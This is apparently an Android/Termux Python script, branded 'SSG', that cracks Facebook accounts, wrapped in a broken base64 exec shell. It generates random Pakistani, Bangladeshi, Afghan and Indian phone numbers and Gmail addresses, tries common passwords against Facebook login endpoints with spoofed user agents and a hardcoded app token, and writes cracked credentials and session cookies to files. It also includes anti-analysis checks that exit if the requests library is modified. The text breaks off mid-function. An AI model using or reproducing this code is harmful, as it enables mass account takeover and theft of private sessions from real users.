# Compiled By Mr Mafia | Muhammad Muzammil
# Github  :  https://github.com/Muzammil-404

import base64
exec(base64.b64decode("#SC OWNER_______________SSG

from ast import Pass
from os import name, path
import os,base64,zlib,pip,urllib
from weakref import proxy
import os,base64,zlib,platform
from urllib.request import parse_http_list
print('\n \033[1;32m[√]\033[1;37m Wait Join whatsap group...!')
os.system('xdg-open https://chat.whatsapp.com/GjKY8C8AMhNJLwhKzCBQtr')
from bs4 import BeautifulSoup as sop
try:
	from bs4 import BeautifulSoup as bsp
except:
	os.system('pip install bs4')
	from bs4 import BeautifulSoup as bsp
try:
        import os,requests,json,time,re,random,sys,uuid,string,subprocess
        from string import *
        from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
        print('\n Installing missing modules ...')
        os.system('pip install requests futures==2 > /dev/null')
        os.system('python s1n.py')  
        os.system('xdg-open https://chat.whatsapp.com/GjKY8C8AMhNJLwhKzCBQtr')
#============Capture Protection============#
first='/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
if not 'print' in open(first+'sessions.py','r').read():
	pass
else:
	exit('\33[1;91mPlease Try This Local Method Capture On Kids ')	 

cellphone = ['SM-G920F|NRD90M', 'SM-T535|LRX22G', 'SM-T231|KOT49H', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-N7100|KOT49H', 'SM-T561|KTU84P', 'GT-N7100|KOT49H', 'GT-I9500|LRX22C', 'SM-J320F|LMY47V', 'SM-G930F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X', 'GT-P5100|IML74K', 'SM-J320F|LMY47V', 'GT-N8000|JZO54K', 'SM-T531|LRX22G', 'SPH-L720|KOT49H', 'GT-I9500|JDQ39', 'SM-G935F|NRD90M', 'SM-T561|KTU84P', 'SM-T531|KOT49H', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'SM-A500FU|MMB29M', 'SM-A500F|MMB29M', 'SM-T311|KOT49H', 'SM-T531|LRX22G', 'SM-J320F|LMY47V', 'SM-J320FN|LMY47V', 'SM-J320F|LMY47V', 'GT-P5210|KOT49H', 'SM-T230|KOT49H', 'GT-I9192|KOT49H', 'SM-T235|KOT4', 'GT-N7100|KOT49H', 'SM-A500F|LRX22G', 'SM-A500F|MMB29M', 'GT-N7100|KOT49H', 'SM-G920F|MMB29K', 'SM-J510FN|NMF26X', 'GT-N8000|JZO54K', 'SM-J320FN|LMY47V', 'SM-J320FN|LMY47V', 'SM-A500H|MMB29M', 'GT-I9300|JSS15J', 'GT-I9500|LRX22C', 'SM-J320F|LMY4', 'SM-J510FN|NMF26X', 'SM-A500F|MMB29M', 'GT-N8000|KOT49H', 'SM-T561|KTU84P', 'SM-G900F|KOT49H', 'GT-S7390|JZO54K', 'SM-J320F|LMY47V', 'GT-P5100|JZO54K', 'SM-A500FU|MMB29M', 'SM-G930F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T561|KTU84P', 'GT-N8000|KOT49H', 'SM-T531|LRX22G', 'SM-J510FN|MMB29M', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5110|JDQ39', 'GT-I9301I|KOT49H', 'SM-A500F|LRX22G', 'SM-G930F|NRD90M', 'SM-T311|KOT4', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H', 'SM-J320M|LMY47V', 'SM-T531|LRX22G', 'SM-T820|NRD90M', 'GT-I9192|KOT49H', 'SM-G935F|MMB29K', 'SM-J701F|NRD90M;', 'GT-I9301I|KOT4', 'SM-J320FN|LMY47V', 'SM-T111|JDQ39', 'SM-A500F|MMB29M', 'SM-J510FN|NMF2', 'SM-T705|LRX22G', 'SM-G920F|NRD90M', 'GT-N5100|JZO54K', 'GT-I9300I|KTU84P', 'GT-I9300I|KTU84P', 'GT-N8000|KOT49H', 'GT-N8000|KOT49H', 'SM-A500F|MMB29M', 'GT-I9190|KOT49H', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5100|JDQ39', 'GT-I9300I|KTU84P', 'GT-N5100|JZO54K', 'GT-N8000|KOT49H', 'GT-I9500|LRX22C', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'GT-N8000|JZO54K', 'SM-T805|LRX22G', 'SM-T231|KOT49H', 'GT-N5100|JZO54K', 'SM-J320H|LMY47V', 'SM-T231|KOT49H', 'SM-G930F|NRD90M', 'SM-G935F|NRD90M', 'SM-T310|KOT49H', 'GT-N8000|KOT49H', 'GT-I9300I|KTU84P', 'SM-G920F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T705|LRX22G;', 'GT-P3110|JZO54K', 'GT-I9192|KOT49H', 'SM-J320F|LMY47V', 'SM-G920F|NRD90M', 'GT-I9300|IMM76D', 'SM-G950F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X;', 'SM-J701F|NRD90M', 'SM-A500F|LRX22G', 'SM-T231|KOT49H', 'SM-T311|KOT49H', 'SM-J320FN|LMY47V', 'GT-P5210|KOT49H', 'SM-T805|LRX22G', 'GT-I9500|LRX22C', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H', 'GT-I9300|JSS15J', 'GT-N7100|KOT49H', 'SM-T531|LRX22G', 'SM-T820|NRD90M', 'SM-T315|JDQ39', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-P5220|JDQ39', 'SM-T525|KOT49H', 'SM-T555|LRX22G', 'GT-I9190|KOT49H', 'SM-J510FN|NMF26X;', 'SM-A500F|MMB29M', 'GT-I9192|KOT49H', 'GT-P5100|JDQ', 'SM-T311|KOT49H']

def clr():
    try:
        data = os.listdir('/sdcard')
        if 'Android' in data:
            print(' \033[1;32m[!]\033[1;37m D'+'ont Try Bypas'+'s Mother Fuc'+'ker...! \n YOUR'+' BYPAS'+'S FUCK'+'ED BY SSG');exit()
        else:exit()
    except:exit()
####### MODL KILLER #######
 
from requests import api
x = open(api.__file__,'r').read()
if "print" in x:
    clr()
elif "sys.stdout.write" in x:
    clr()
else:
    pass
from requests import sessions
 
x = open(sessions.__file__,'r').read()
if "print" in x:
    clr()
elif "sys.stdout.write" in x:
    clr()
else:
    pass
from requests import models
x = open(models.__file__,'r').read()
if "print" in x:
    clr()
 
elif "sys.stdout.write" in x:
    clr()
else:
    pass

#__________NEW IDX UA_____________#

def S1():
	en = random.choice(['en_US','en_GB','en_PK','ru_RU','de_DE','th_TH','en_BD','en_IN','en_AF'])
	kt = random.choice(['com.facebook.katana','com.facebook.orca','com.facebook.mlite'])
	fbcr = random.choice(['o2 - de', 'Verizon - us','MY CELCOM','Vodafone - uk','null','DTAC','IND airtel','Nepal Telecom'])
	s= "[FBAN/FB4A;FBAV/"+str(random.randint(111,999))+'.0.0.'+str(random.randrange(9,99))+str(random.randint(111,999)) +";FBBV/"+str(random.randint(111111111,999999999))
	ua = f"Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)};  Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)})"+"[FBAN/"+"FB4A;FBAV/"+str(random.randint(11,77))+".0.0."+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/294.0.0.39.118;FBBV/253340706;FBDM/{density=3.5,width=1440,height=2730};FBLC/en_US;FBRV/253980635;FBCR/Spark NZ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N9300;FBSV/6.0.1;FBOP/1;FBCA/arm64-v8a:;]','[FBAN/FB4A;FBAV/359.0.0.30.118;FBBV/358614015;FBDM/{density=2.0,width=720,height=1436};FBLC/en_Qaag_US;FBRV/359080319;FBCR/Telenor;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/vivo X3S;FBSV/4.2.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/323.0.0.46.119;FBBV/298672707;FBDM/{density=2.75,width=1080,height=2168};FBLC/ru_RU;FBRV/299927973;FBCR/MTS RUS;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi 5S;FBSV/10.0.1;FBOP/1;FBCA/arm64-v8a:;]','[FBAN/FB4A;FBAV/79.0.0.18.71;FBBV/31009847;FBDM/{density=1.5,width=480,height=854};FBLC/es_LA;FBCR/entel;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/Y530-U051;FBSV/4.3;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
	
    
		

#__________BD UA_____________#

ugen=[]
for xd in range(10000):
        aa='Mozilla/5.0 (Linux; U; Android'
        b=random.choice(['6','7','8','9','10','11','12','13'])
        c=f' TL-tl; {str(cellphone)}'
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
        h=random.randrange(100,114)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/537.36'
        uaku2=f'{aa} {b}; {c}) {g}{h}.{i}.{j}.{k} {l}'
        ugen.append(uaku2)
for agent in range(10000):
        aa='Mozilla/5.0 (Linux; Android ;'
        b=random.choice(['6','7','8','9','10','11','12'])
        c='en-us; 10; T-Mobile myTouch 3G Slide Build/'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
        h=random.randrange(90,114)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/533.1'
        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        ugen.append(fullagnt) 
    

def clear():
	os.system('clear')
	print(logo)
logo=("""\033[1;37m
 .d8888b.   .d8888b.   .d8888b.  
d88P  Y88b d88P  Y88b d88P  Y88b 
Y88b.      Y88b.      888    888 
 "Y888b.    "Y888b.   888        
    "Y88b.     "Y88b. 888  88888 
      "888       "888 888    888 
Y88b  d88P Y88b  d88P Y88b  d88P 
 "Y8888P"   "Y8888P"   "Y8888P88 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
\033[1;37mAuthor    : \033[1;32m  SSG-SSG
\033[1;37mTool      : \033[1;32m  File /Random
\033[1;37mVersion   :\033[1;32m   0.2     
\033[1;37m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\033[1;37m""")

def line():
	print(f'\033[1;37m-----------------------------------------------')
	

loop=0
oks=[]
cps=[]
pcp=[]
ck=[]
#_________Year checker_________#
def asha(uid):
    if len(uid)==15:
        if uid[:10] in ['1000000000']       :alif = ' (*-*) 2009 √'
        elif uid[:9] in ['100000000']       :alif = ' ACCOUNT  2009 √'
        elif uid[:8] in ['10000000']        :alif = ' ACCOUNT 2009 √'
        elif uid[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:alif = ' ACCOUNT 2009 √'
        elif uid[:7] in ['1000006','1000007','1000008','1000009']:alif = ' ACCOUNT 2010 √'
        elif uid[:6] in ['100001']          :alif = ' ACCOUNT 2010/2011 √'
        elif uid[:6] in ['100002','100003'] :alif = ' ACCOUNT 2011/2012 √'
        elif uid[:6] in ['100004']          :alif = ' ACCOUNT 2012/2013 √'
        elif uid[:6] in ['100005','100006'] :alif = ' ACCOUNT 2013/2014 √'
        elif uid[:6] in ['100007','100008'] :alif = ' ACCOUNT 2014/2015 √'
        elif uid[:6] in ['100009']          :alif = ' ACCOUNT 2015 √'
        elif uid[:5] in ['10001']           :alif = ' ACCOUNT 2015/2016 √'
        elif uid[:5] in ['10002']           :alif = ' ACCOUNT 2016/2017 √'
        elif uid[:5] in ['10003']           :alif = ' ACCOUNT 2018/2019 √'
        elif uid[:5] in ['10004']           :alif = ' ACCOUNT 2019/2020 √'
        elif uid[:5] in ['10005']           :alif = ' ACCOUNT 2020 √'
        elif uid[:5] in ['10006','10007','']:alif = ' ACCOUNT 2021 √'
        elif uid[:5] in ['10008']           :alif = ' ACCOUNT 2022 √'
        elif uid[:5] in ['10009']           :alif = ' ACCOUNT 2023 √'
        else:alif=''
    elif len(uid) in [9,10]:
        alif = ' ACCOUNT 2008/2009 √'
    elif len(uid)==8:
        alif = ' ACCOUNT 2007/2008 √'
    elif len(uid)==7:
        alif = ' ACCOUNT 2006/2007 √'
    else:alif=''
    return alif

#_________Cloning Menu_________#
def menu():
    try:
                clear()        
                x = ("***")
                if x == ("***"):
                        print('[1] FILE MENU ')
                        print('[2] RANDOM MENU')                                    
                        print('[0] EXIT ')
                        line()
                        xd=input(' CHOOSE AN OPTION: ')
                        
                        if xd in ['1','01']:
                                clear()
                                
                                print(' PUT FILE EXAMPLE :  /sdcard/file.txt.etc..')
                                line()
                                file = input(' PUT FILE PATH\033[1;37m: ')
                                try:
                                        fo = open(file,'r').read().splitlines()
                                except FileNotFoundError:
                                        print(' FILE LOCATION NOT FOUND ')
                                        time.sleep(1)
                                        menu()
                                clear()
                                print('[1] M-1 MIX')
                                print('[2] M-2 NEW')
                                print('[3] M-3 MIX')
                                #print('[4] M-4 ')
                                line()
                                mthd=input(' CHOOSE : ')
                                line()
                                clear()
                                plist = []
                                try:
                                        ps_limit = int(input(' HOW MANY PASSWORDS DO YOU WANT TO ADD ? '))
                                except:
                                        ps_limit =1
                                line()
                                clear()
                                print('\033[1;32m EXAMPLE : first last,firtslast,first123')
                                line()
                                for i in range(ps_limit):
                                        plist.append(input(f' PUT PASSWORD {i+1}: '))
                                line()
                                clear()
                                #print(' DO YOU WENT SHOW COOKIES :? (Y/N): ')
                                #line()
                                #cx=input(' CHOOSE : ')
                                #if cx in ['y','Y','yes','Yes','1']:
                                       # pcp.append('y')
                                #else:
                                       # pcp.append('n')
                                with tred(max_workers=30) as crack_submit:
                                        clear()
                                        total_ids = str(len(fo))
                                        
                                        print('[√] TOTAL ACCOUNT : \033[1;32m'+total_ids+f' ')
                                        print("[√]\033[1;37m USE FLIGHT MOOD 5 SECOND\033[1;37m")
                                        line()
                                        for user in fo:
                                                ids,names = user.split('|')
                                                passlist = plist
                                                if mthd in ['1','01']:
                                                        crack_submit.submit(api1,ids,names,passlist)
                                                elif mthd in ['2','02']:
                                                        crack_submit.submit(newidx,ids,names,passlist)
                                                elif mthd in ['3','03']:
                                                        crack_submit.submit(ffb,ids,names,passlist)
                                                #elif mthd in ['4','04']:
                                                       #crack_submit.submit(newidx,ids,names,passlist)        
                                print('\033[1;37m')
                                line()
                                print(' THE PROCESS HAS COMPLETED')
                                print(' TOTAL OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                                line()
                                input(' PRESS ENTER TO BACK ')
                                os.system('python s1n.py')
                        elif xd in ['2','02']:
                                clear()
                                print(' [1] PAKISTAN\n [2] BANGLADESH\n [3] AFGHANISTAN\n [4] INDIA\n [5] GMAIL\n [0] BACK MENU')
                                line()
                                x=input(' Choose: ')
                                if x in ['1','01']:
                                        pak()
                                elif x in ['2','02']:
                                        bd()
                                elif x in ['3','03']:
                                        afg()
                                elif x in ['4','04']:
                                        ind()        
                                elif x in ['5','05']:  
                                        gmail()      
                                else:
                                        menu()                                   
                        elif xd in ['0','00']:
                                exit()
                        
    except requests.exceptions.ConnectionError:
                print('\n NO INTERNET CONNECTION ...')
                exit()
def pak():
                user=[]
                clear()
                print('\x1b[1;92m EXAMPLE CODE EXAMPLE : 0300,0315,0333,0345')
                code = input('\033[1;37m PUT CODE: ')
                try:
                        limit = int(input('\x1b[1;92m EXAMPLE : 2000, 3000, 5000, 10000\n\033[1;37m PUT LIMIT : '))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
                        user.append(nmp)
                with tred(max_workers=30) as S1N:     
                        clear()
                        
                        tl = str(len(user))
                        print('\x1b[1;97m [\x1b[1;92m√\x1b[1;97m] \x1b[1;97mTOTAL ACCOUNT: \033[1;97m'+tl)
                        print('\x1b[1;97m [\x1b[1;92m√\x1b[1;97m] \x1b[1;97mSELECT CODE: \033[1;97m '+code)
                        print('\x1b[1;97m [\x1b[1;92m√\x1b[1;97m] \x1b[1;97mCLONING....START\033[1;97m')
                        line()
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'khankhan','malik123','kingkhan','baloch123','pak123','khan123','janjan','ali123']
                                S1N.submit(rd,ids,passlist)
                print('\033[1;37m')
                line()
                print(' THE PROCESS HAS COMPLETED')
                print(' TOTAL OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                line()
                input(' PRESS ENTER TO BACK ')
                os.system('python s1n.py')
def bd():
                user=[]
                clear()
                print('\x1b[1;92m EXAMPLE CODE EXAMPLE : 017, 018, 019, 016, 9196, 9178')
                code = input('\033[1;37m PUT CODE: ')                                              
                try:
                        limit = int(input('\x1b[1;92m EXAMPLE : 2000, 3000, 5000, 10000\n\033[1;37m PUT LIMIT : '))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(8))
                        user.append(nmp)
                with tred(max_workers=30) as S1N:     
                        clear()
                        
                        tl = str(len(user))
                        print('\x1b[1;97m [\x1b[1;92m•\x1b[1;97m] \x1b[1;97mTOTAL ACCOUNT: \033[1;97m'+tl)
                        print('\x1b[1;97m [\x1b[1;92m•\x1b[1;97m] \x1b[1;97mSELECT CODE: \033[1;97m '+code)
                        print('\x1b[1;97m [\x1b[1;92m•\x1b[1;97m] \x1b[1;97mCRACKING....ON \033[1;97m')
                        line()
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,ids[:8],ids[:7],'mimmim','fatema','jannat','sadiya','Bangla','@@@###','304050','102030','203040','708090','i love you','FREE FIRE','free fire','bangladesh','bangla']
                                S1N.submit(bd1,ids,passlist)
                print('\033[1;37m')
                line()
                print(' THE PROCESS HAS COMPLETED')
                print(' TOTAL OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                line()
                input(' PRESS ENTER TO BACK ')
                os.system('python s1n.py')

def afg():
                user=[]
                clear()
                print('\x1b[1;92m EXAMPLE CODE EXAMPLE : 9377,9379,9374')
                code = input('\033[1;37m PUT CODE: ')
                try:
                        limit = int(input('\x1b[1;92m EXAMPLE : 2000, 3000, 5000, 10000\n\033[1;37m PUT LIMIT : '))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
                        user.append(nmp)
                with tred(max_workers=30) as S1N:     
                        clear()
                        
                        tl = str(len(user))
                        print('\x1b[1;97m [\x1b[1;92m•\x1b[1;97m] \x1b[1;97mTOTAL ACCOUNT: \033[1;97m'+tl)
                        print('\x1b[1;97m [\x1b[1;92m•\x1b[1;97m] \x1b[1;97mSELECT CODE: \033[1;97m '+code)
                        print('\x1b[1;97m [\x1b[1;92m•\x1b[1;97m] \x1b[1;97mCRACKING....ON \033[1;97m')
                        line()
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'afghan','afghan12345','afghan123','600700','afghanistan','afghan1122','500500','100200','10002000','900900','kabul123','Û±Û³Û³Û³ÛµÛ¶Û·Û¸Û¹','Û±Û³Û³Û³ÛµÛ¶','afghan1234','kabul1234','khankhan','khan123','khan123456','khan786']
                                S1N.submit(rd,ids,passlist)
                print('\033[1;37m')
                line()
                print(' THE PROCESS HAS COMPLETED')
                print(' TOTAL OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                line()
                input(' PRESS ENTER TO BACK ')
                os.system('python s1n.py')
def ind():
                user=[]
                clear()
                print('\x1b[1;92m EXAMPLE CODE EXAMPLE : 91***,etc')
                code = input('\033[1;37m PUT CODE: ')
                try:
                        limit = int(input('\x1b[1;92m EXAMPLE : 2000, 3000, 5000, 10000\n\033[1;37m PUT LIMIT : '))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
                        user.append(nmp)
                with tred(max_workers=30) as S1N:     
                        clear()
                        
                        tl = str(len(user))
                        print('\x1b[1;97m [\x1b[1;92m•\x1b[1;97m] \x1b[1;97mTOTAL ACCOUNT: \033[1;97m'+tl)
                        print('\x1b[1;97m [\x1b[1;92m•\x1b[1;97m] \x1b[1;97mSELECT CODE: \033[1;97m '+code)
                        print('\x1b[1;97m [\x1b[1;92m•\x1b[1;97m] \x1b[1;97mCRACKING....ON \033[1;97m')
                        line()
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'57273200','hindustan','59039200','57575751']
                                S1N.submit(rd,ids,passlist)
                print('\033[1;37m')
                line()
                print(' THE PROCESS HAS COMPLETED')
                print(' TOTAL OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                line()
                input(' PRESS ENTER TO BACK ')
                os.system('python s1n.py')
                
def gmail():
                os.system('rm -rf .re.txt')
                clear()
                print('\033[1;37m Example: eshal, ali, abbas, agnel\033[1;97m')
                line()
                first = input(' Put first name: ')
                line()
                print('\033[1;37m example: khan, ahmad, ali \033[1;97m')
                line()
                last = input(' Put last name: ')
                line()
                print(' Example: @gmail.com , @yahoo.com etc...')
                line()
                domain = input(' domain: ')
                line()
                try:
                        limit=int(input(' Put limit: '))
                except ValueError:
                        limit = 5000
                line()
                print(' Getting gmails...')
                lists = ['3','4']
                for xd in range(limit):
                        lchoice = random.choice(lists)
                        if '3' in lchoice:
                                mail = ''.join(random.choice(string.digits) for _ in range(3))
                                open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
                        else:
                                mail = ''.join(random.choice(string.digits) for _ in range(4))
                                open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
                        fo = open('.re.txt', 'r').read().splitlines()
                with tred(max_workers=30) as S1N:
                        total = str(len(fo))
                        clear()
                        print('Total account : \033[1;32m'+total)                        
                        print('Gmail Cracking started  ')
                        line()
                        for user in fo:
                                ids,names = user.split('|')
                                first_name = names.rsplit(' ')[0]
                                try:
                                        last_name = names.rsplit(' ')[1]
                                except IndexError:
                                        last_name = 'Khan'
                                fs = first_name.lower()
                                ls = last_name.lower()
                                passlist = [fs+ls,fs+' '+ls,fs+'123',fs+'12345',fs+'1122',fs,fs+'1234',fs+'786',fs+'12',ls+'123',fs+ls+'123',ls+'12345','khankhan','57273200']
                                S1N.submit(rd,ids,passlist)
                print('\033[1;37m')
                line()
                print(' THE PROCESS HAS COMPLETED')
                print(' TOTAL OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                line()
                input(' Press enter to back ')
                os.system('python s1n.py')

def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [\x1b[1;92mSSG\x1b[1;92m-\x1b[1;92mM3\x1b[1;97m] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(' ')[0]
                try:
                        last = names.split(' ')[1]
                except:
                        last = 'Khan'
                ps = first.lower()
                ps2 = last.lower()
                for fikr in passlist:
                        pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
                        ua=random.choice(S1())
                        head = {'Host': 'mbasic.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
                        getlog = session.get(f'https://mbasic.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                        idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                        complete = session.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                        Aws=session.cookies.get_dict().keys()
                        if "c_user" in Aws:
                                coki=session.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\r\r\033[1;32m [SSG-OK] '+uid+' √ '+pas)                                
                                open('/sdcard/SSG-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/SSG-OK-COOKiE.txt','a').write(ids+'|'+pas+'|'+kuki+'\n')
                              
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Aws:
                                if 'y' in pcp:
                                        print('\r\r\033[1;37m [SSG-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/SSG-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
                        else:
                                continue
        except requests.exceptions.ConnectionError:
                time.sleep(20)
        loop+=1
def api1(ids,names,passlist):
	try:
		global ok,loop,sim_id
		sys.stdout.write('\r\r\033[1;37m [\x1b[1;92mSSG\x1b[1;92m-\x1b[1;92mM1\x1b[1;97m] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()	
		fn = names.split(' ')[0]
		try:
			ln = names.split(' ')[1]
		except:
			ln = fn
		for pw in passlist:
			pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
			head = {'User-Agent':S1(),'Accept-Encoding':'gzip, deflate','Connection':'close','Content-Type':'application/x-www-form-urlencoded','Host':'graph.facebook.com','X-FB-Net-HNI':str(random.randint(2e4, 4e4)),'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type':'WIFI','X-Tigon-Is-Retry':'False','x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32','x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags':'graphservice','X-FB-HTTP-Engine':'Liger','X-FB-Client-IP':'True','X-FB-Server-Cluster':'True','x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
			data =  {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale':'en_GB','client_country_code':'GB','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':' 350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
			po = requests.post('https://b-graph.facebook.com/auth/login',data=data,headers=head).json()
			if 'session_key' in po:
				uid = str(po['uid'])
				print('\r\r\033[1;32m [SSG-OK] '+uid+' √ '+pas)                                
				ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
				ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
				cookies = f"sb={ssbb};{ckkk}"
				#print('\033[1;37m [🍪] Cookies :- '+cookies)
				open('/sdcard/SSG-OK.txt','a').write(uid+'|'+pas+'|'+cookies+'\n')
				oks.append(uid)
				break
			elif 'www.facebook.com' in po['error']['message']:
				uid = str(po['error']['error_data']['uid'])
				print(f'\r\r\033[1;33m [SSG-CP] '+uid+' | '+pas+'\033[1;97m')
				open('/sdcard/SSG-CP.txt','a').write(uid+'|'+pas+'\n')
				cps.append(uid)
				break
			else:
				continue
		loop+=1
	except requests.exceptions.ConnectionError:
		time.sleep(20)
	except Exception as e:
		pass
def rd(ids,passlist):
	try:
		global oks,loop
                
		sys.stdout.write('\r\r\033[1;37m [\x1b[1;92mSSG\x1b[1;92m-\x1b[1;92mXD\x1b[1;97m] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()		
		for pas in passlist:                                          
			accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'			
